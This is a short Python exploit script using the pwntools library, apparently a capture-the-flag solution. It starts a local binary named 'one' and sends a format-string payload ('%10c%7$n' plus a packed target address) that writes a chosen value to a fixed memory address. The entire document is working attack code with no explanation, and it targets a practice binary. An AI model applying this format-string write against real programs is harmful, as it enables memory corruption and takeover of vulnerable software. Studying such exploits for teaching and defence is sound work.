from pwn import *

target = process('./one')

addr = 0x0040403c
log.info(hex(addr))

payload = b"%10c%7$n"
payload += p64(addr)

target.sendline(payload)

s = target.recvall().decode('latin-1')
print(s)
           
